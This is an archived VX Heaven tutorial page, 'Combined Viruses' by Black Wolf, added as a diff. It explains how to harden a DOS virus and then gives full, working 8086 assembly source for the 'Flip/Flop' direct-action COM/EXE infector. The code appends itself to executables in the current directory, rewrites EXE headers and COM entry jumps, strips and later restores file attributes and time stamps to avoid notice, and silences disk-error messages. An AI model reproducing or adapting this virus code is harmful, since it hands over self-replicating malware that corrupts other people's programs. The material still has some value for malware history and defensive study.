@@ -1,0 +1,436 @@
+<?xml version="1.0"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title> Black Wolf 'Combined Viruses' (VX heaven)</title>
+<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+<meta name="Author" content="Black Wolf"/>
+<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Black Wolf,Combined Viruses, infected, find, movsw, attribs, jump, time, header, restore, virus, mask, check, reset, error, bytes, write"/>
+<meta name="Description" content="Three main problems are apparent in the last two viruses that we need to fix. The first is that there is little or no error handling in the viruses. This can cause that wonderful 'Disk Error. Abort, Retry, or Fail?' message to appear on a write protected disk, which is generally not desirable. The next problem is that both viruses can be stopped by the read-only attribute."/>
+<script type="text/javascript">
+//<![CDATA[
+try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"d5833932062e06459ba2198cebe1368d1412fecc-1498755768-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
+//]]>
+</script>
+<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
+<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vbw03.html"/>
+<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
+</head>
+<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
+<div class="s1">
+<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
+<div style="float: right;"><div id="plusone"></div></div>
+<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
+<div style="float: right;" class="addthis_toolbox addthis_default_style">
+<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
+<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
+<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
+</div>
+<div style="float: right;">
+<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
+<form action="/search.php" id="cse-search-box">
+<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
+<input type="hidden" name="cof" value="FORID:10"/>
+<input type="hidden" name="ie" value="UTF-8"/>
+<input type="text" name="q" size="12" value=" "/>
+<input type="submit" name="sa" value="Search"/>
+</form>
+</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
+<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
+</div>
+<div class="s2"><h1>Combined Viruses</h1><p><a href="/lib/?lang=en&amp;author=Black%20Wolf"> Black Wolf</a><br/></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vbw03.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=DO#vbw03">Back to index</a>] [<a href="/lib/vbw03.html#disqus_thread">Comments</a>]<br/> 
+<p>Now that we have learned how to infect both COM and EXE files, it's time to look at some of the "details" that we haven't covered. Three main problems are apparent in the last two viruses that we need to fix. The first is that there is little or no error handling in the viruses. This can cause that wonderful "Disk Error. Abort, Retry, or Fail?" message to appear on a write protected disk, which is generally not desirable. The next problem is that both viruses can be stopped by the read-only attribute. This is not true with most viruses, nor should it be with ours. The last is the time/date stamp. When a file is written to and closed, DOS automatically sets the time and date fields to whenever it was closed, causing the new host to have a current time stamp. To avoid this, we must get the old stamp and reset it once we are done with the infection (just before closing the file). The next virus will still be direct-action, but it will employ all the above techniques and have the ability to infect both EXE and COM files. It will still remain in the current directory to make it safer to test, but aside from that it will be a fairly effective direct-action virus. The big things to notice are the methods to make as much of the code as possible usable for both .COM and .EXE infections, the error handler, and the attribue/time/date fixes. The virus is name the Flip/Flop because if it is attached to a COM file, it will only infect EXE files, whereas if it is attached to an EXE file it will only infect COM files.</p>
+<pre class="source">
+; The Flip/Flop virus.
+;
+;This file is a direct action .COM/.EXE file infector written
+;in TASM compatible 8086 assembly. It is presented as a part of
+;VIROLOGY 101 (c) 1993 Black Wolf Enterprises. This is a live virus
+;for educational purposes only. Please do not release it. Execute
+;only on an isolated machine under controlled conditions.
+
+;This virus also needs a four-byte stub to be attached to it after
+;compilation. NOP's will work fine.
+
+;One interesting characteristic of this virus is that if it is on
+;an EXE file, it will infect .COM files, but if it is on a COM
+;file, it will only search for EXE's. It will infect each
+;uninfected file of whichever type chosen in the current directory
+;on runtime.
+
+.model tiny
+.radix 16
+.code
+org 100
+start:
+COM_ENTRY:
+call get_offset
+
+lea si,[bp+storage_bytes] ;Restore original bytes to
+mov di,100 ;host.
+movsw
+movsw
+
+mov byte ptr [COM_EXE+bp],0 ;Remember host is COM file.
+jmp short Main_Virus ;Go to main virus.
+
+Enter_EXE:
+push es ;Save current ES (and DS) registers
+push cs cs
+pop es ds ;Set ES = DS = CS
+
+call get_offset
+lea si,[Old_IP+bp]
+lea di,[Save_IP+bp] ;Setup old variables for infection
+movsw
+movsw
+movsw
+movsw
+
+mov byte ptr [COM_EXE+bp],1 ;Remember host is EXE file.
+Main_Virus:
+call Set_Handler
+
+lea dx,[DTA+bp] ;Set DTA to new address
+call Set_DTA
+
+cmp byte ptr [COM_EXE+bp],1 ;If virus is on an .EXE,
+jne Find_EXE ;infect COM files and
+;vice-versa
+Find_COM:
+lea dx,[Com_mask+bp] ;Find a .COM file
+jmp Find_First
+Find_Exe:
+lea dx,[Exe_mask+bp]
+Find_First:
+mov ah,4e
+xor cx,cx
+Find_File:
+int 21
+jc Outa_Files
+
+xor ah,ah ;Get attributes into CX
+lea dx,[DTA+1e+bp]
+call do_attribs
+
+mov word ptr [bp+attribs],cx ;Save attribs
+xor cx,cx
+mov al,1
+call do_attribs ;Set attribs to normal
+
+mov ax,3d02 ;Open file read/write
+lea dx,[bp+DTA+1e]
+int 21
+jc Outa_Files
+
+xchg bx,ax
+
+mov al,0 ;Get and save time stamp
+call Do_Time
+mov word ptr [bp+Time],cx
+mov word ptr [bp+Date],dx
+
+mov ah,3f
+mov cx,1a ;Read beginning of file
+lea dx,[exe_header+bp] ;(header if .EXE)
+int 21
+jc Close_UP
+
+call Check_Infected ;Is it infected?
+jc Close_Up
+
+cmp word ptr [exe_header+bp],'ZM' ;Is EXE?
+je Infect_EXE ;go Infect EXE
+cmp word ptr [exe_header+bp],'MZ'
+je Infect_EXE
+
+Infect_Com:
+call Do_Com ;Infect COM file
+jmp short Close_Up
+
+Infect_Exe:
+call Do_Exe ;Infect EXE
+
+Close_Up:
+mov al,01 ;Reset time stamp
+mov cx,word ptr [bp+Time]
+mov dx,word ptr [bp+Date]
+call Do_Time
+
+mov ah,3e ;Close file
+int 21
+
+mov al,01 ;Reset Attributes
+mov cx,word ptr [bp+attribs]
+lea dx,[DTA+1e+bp]
+call Do_Attribs
+
+mov ah,4f ;Find another file to infect...
+jmp Find_File
+
+Outa_Files:
+call Reset_Handler ;Chose appropriate restore
+cmp byte ptr [COM_EXE+bp],1 ;algorithm
+je Restore_EXE
+
+Restore_COM:
+mov dx,80
+call Set_DTA ;Reset DTA
+mov di,100 ;jump 100
+push di
+ret
+
+Restore_EXE:
+pop es ;Restore seg registers
+push es
+pop ds
+
+mov dx,80 ;Reset DTA
+call Set_DTA
+
+mov ax,es
+add ax,10
+add word ptr cs:[Save_CS+bp],ax
+add ax,word ptr cs:[Save_SS+bp] ;Set SS:SP
+;and go CS:IP
+cli
+mov ss,ax
+mov sp,word ptr cs:[Save_SP+bp]
+sti
+
+db 0ea ;Far jump to CS:IP
+Save_IP dw 0
+Save_CS dw 0
+Save_SS dw 0
+Save_SP dw 0
+
+Old_IP dw 0
+Old_CS dw 0fff0
+Old_SS dw 0fff0
+Old_SP dw 0
+
+Set_DTA:
+mov ah,1a
+int 21
+ret
+
+Do_attribs: ;Performs file attribute functions
+mov ah,43
+int 21
+ret
+Do_Time: ;Performs time stamp functions
+mov ah,57
+int 21
+ret
+
+Get_offset: ;Get diplacement of virus into BP
+call next
+next:
+pop bp
+sub bp,offset next
+ret
+Do_COM: ;Infect COM file
+lea si,[exe_header+bp]
+lea di,[storage_bytes+bp]
+movsw
+movsw
+
+call Go_EOF
+
+sub ax,3
+mov word ptr [jump_bytes+1+bp],ax
+
+call write_virus
+call Go_BOF
+
+mov ah,40
+lea dx,[jump_bytes+bp] ;write in jump
+mov cx,4
+int 21
+ret
+
+Do_EXE:
+call Save_Old_Header
+call Go_EOF
+
+push ax dx
+call calculate_CSIP
+pop dx ax
+
+call calculate_size
+call write_virus
+call Go_BOF
+
+mov ah,40
+mov cx,1a
+lea dx,[exe_header+bp] ;Write header
+int 21
+ret
+
+Go_EOF: ;Go to end of file
+mov ax,4202
+jmp Move_FP
+Go_BOF: ;Go to beginning of file
+mov ax,4200
+Move_FP:
+xor cx,cx
+xor dx,dx
+int 21
+ret
+
+Write_Virus:
+mov ah,40
+mov cx,end_prog-start ;Append virus to file
+lea dx,[bp+start]
+int 21
+ret
+
+Save_Old_Header:
+mov ax,word ptr [exe_header+bp+0e] ;Save old SS
+mov word ptr [Old_SS+bp],ax
+mov ax,word ptr [exe_header+bp+10] ;Save old SP
+mov word ptr [Old_SP+bp],ax
+mov ax,word ptr [exe_header+bp+14] ;Save old IP
+mov word ptr [Old_IP+bp],ax
+mov ax,word ptr [exe_header+bp+16] ;Save old CS
+mov word ptr [Old_CS+bp],ax
+ret
+
+calculate_CSIP:
+push ax
+mov ax,word ptr [exe_header+bp+8] ;Get header length
+mov cl,4 ;and convert it to
+shl ax,cl ;bytes.
+mov cx,ax
+pop ax
+sub ax,cx ;Subtract header
+sbb dx,0 ;size from file
+;size for memory
+;adjustments
+mov cl,0c ;Convert DX into
+shl dx,cl ;segment Address
+mov cl,4
+push ax ;Change offset (AX) into
+shr ax,cl ;segment, except for last
+add dx,ax ;digit. Add to DX and
+shl ax,cl ;save DX as new CS, put
+pop cx ;left over into CX and
+sub cx,ax ;store as the new IP.
+
+add cx,Enter_EXE-start ;Adjust to go to EXE_Entry
+
+mov word ptr [exe_header+bp+14],cx
+mov word ptr [exe_header+bp+16],dx ;Set new CS:IP
+mov word ptr [exe_header+bp+0e],dx ;Set new SS = CS
+mov word ptr [exe_header+bp+10],0fffe ;Set new SP
+mov byte ptr [exe_header+bp+12],'V' ;mark infection
+ret
+
+calculate_size:
+push ax ;Save offset for later
+
+add ax,end_prog-start ;Add virus size to DX:AX
+adc dx,0
+
+mov cl,7
+shl dx,cl ;convert DX to pages
+mov cl,9
+shr ax,cl
+add ax,dx
+inc ax
+mov word ptr [exe_header+bp+04],ax ;save # of pages
+
+pop ax ;Get offset
+mov dx,ax
+shr ax,cl ;Calc remainder
+shl ax,cl ;in last page
+sub dx,ax
+mov word ptr [exe_header+bp+02],dx ;save remainder
+ret
+
+Set_Handler:
+mov ax,3524 ;Get Int 24 address
+int 21 ;(Critical Error)
+mov word ptr [IP_24+bp],bx
+mov word ptr [CS_24+bp],es
+
+mov ax,2524 ;Set Int 24
+lea dx,[Int_24+bp]
+int 21
+
+push ds ;Restore ES
+pop es
+ret
+
+Reset_Handler:
+mov dx,word ptr cs:[CS_24+bp]
+mov ds,dx
+mov dx, word ptr cs:[IP_24+bp]
+mov ax,2524 ;Reset handler to old one
+int 21
+
+push es ;restore DS.
+pop ds
+ret
+
+Int_24: ;Return error code in al without
+mov al,3 ;printing annoying message
+iret
+
+Check_Infected:
+cmp byte ptr [exe_header+bp+3],'V' ;check .COM infected
+je Is_Infected
+cmp byte ptr [exe_header+bp+12],'V' ;check .EXE
+je Is_Infected ;infected
+clc
+ret
+Is_Infected:
+stc
+ret
+
+Exe_mask db '*.EXE',0
+Com_mask db '*.COM',0
+
+jump_bytes db 0e9,0,0,'V' ;jump for COM's with ID
+
+storage_bytes: ;Initial storage bytes
+nop
+nop
+int 20
+
+COM_EXE db 0 ;0 = COM, 1 = EXE
+end_prog:
+Time dw ?
+Date dw ?
+attribs dw ?
+IP_24 dw ?
+CS_24 dw ?
+exe_header db 1a dup(?)
+DTA:
+end start
+</pre>
+<div id="disqus_thread"></div>
+<script type="text/rocketscript">
+        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname
+
+        /* * * DON'T EDIT BELOW THIS LINE * * */
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
+<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
+<div style="margin-top: 2px; float: left;" class="adsapeu">
+<script type="text/rocketscript">
+<!--
+var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
+//-->
+</script>
+</div>
+<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
+<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vbw03">de</a><a href="/lib/index.php?lang=en&amp;id=vbw03">en</a><a href="/lib/index.php?lang=es&amp;id=vbw03">es</a><a href="/lib/index.php?lang=it&amp;id=vbw03">it</a><a href="/lib/index.php?lang=fr&amp;id=vbw03">fr</a><a href="/lib/index.php?lang=pl&amp;id=vbw03">pl</a><a href="/lib/index.php?lang=ru&amp;id=vbw03">ru</a><a href="/lib/index.php?lang=ua&amp;id=vbw03">ua</a></div>
+</body>
+</html>
